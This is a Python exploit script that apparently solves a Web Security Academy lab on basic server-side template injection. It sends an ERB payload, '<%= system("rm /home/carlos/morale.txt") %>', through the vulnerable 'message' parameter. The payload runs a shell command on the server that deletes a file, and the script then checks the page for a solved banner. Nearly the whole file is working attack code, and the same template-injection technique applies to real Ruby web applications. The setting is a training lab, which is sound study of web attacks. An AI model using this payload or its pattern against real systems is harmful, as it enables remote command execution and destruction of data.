import requests

# --- Configuration ---
# Lab: Basic server-side template injection
BASE_URL = "https://0aa80032046d9ef684cf05a2000b00fd.web-security-academy.net/"

def exploit_erb_ssti(base_url):
    """
    Exploits Basic SSTI in an ERB (Ruby) template to delete a file.
    """
    # The payload: <%= system("rm /home/carlos/morale.txt") %>
    # We leave it raw; requests.get(params=...) will encode it automatically.
    payload = '<%= system("rm /home/carlos/morale.txt") %>'
    
    # "message" is the vulnerable parameter
    params = {'message': payload}
    
    print(f"[*] Sending payload: {payload}")
    
    # Send request
    response = requests.get(base_url, params=params)
    
    # Check for success
    # Note: Sometimes you need to reload the page to see the 'Solved' banner, 
    # but often the lab updates immediately.
    if "Congratulations" in response.text or "solved" in response.text:
        print("[+] Success! 'morale.txt' deleted.")
    else:
        # If it didn't verify immediately, we print a check message
        print("[-] Payload sent. Check the lab banner manually.")

if __name__ == "__main__":
    exploit_erb_ssti(BASE_URL)